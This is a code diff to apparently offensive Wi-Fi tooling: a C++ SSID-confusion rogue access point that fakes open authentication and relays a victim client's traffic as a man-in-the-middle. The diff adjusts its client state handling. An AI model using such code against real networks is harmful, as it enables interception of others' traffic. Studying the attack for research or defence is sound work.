@@ -39,7 +39,7 @@ FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pd
 FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
 		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
-			if(client_state.get_state() >= ClientState::Associated) return STOP;
+			if(client_state.get_state() >= ClientState::GotMitm) return STOP;
 			// Open System Auth seq=1 ->  seq=2 success
 			Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
 			resp.addr3(rogue_ap->get(SK::mac));
@@ -127,9 +127,12 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 #undef SOLVE_OR_CONTINUE
 
 	if(addr2 == sta.get(SK::mac)) {
+		if(dot11->find_pdu<Dot11Beacon>()) return; // client_ack_vif beacon leak
 		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
 			client_state.update_state(ClientState::Target_disconnected);
-		if(dot11->type() == Dot11::DATA && client_state.get_state() < ClientState::GotMitm)
+		if(dot11->type() == Dot11::DATA &&
+		   client_state.get_state() >= ClientState::Associated &&
+		   client_state.get_state() < ClientState::GotMitm)
 			client_state.update_state(ClientState::GotMitm);
 		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
 		send_to_real(raw);
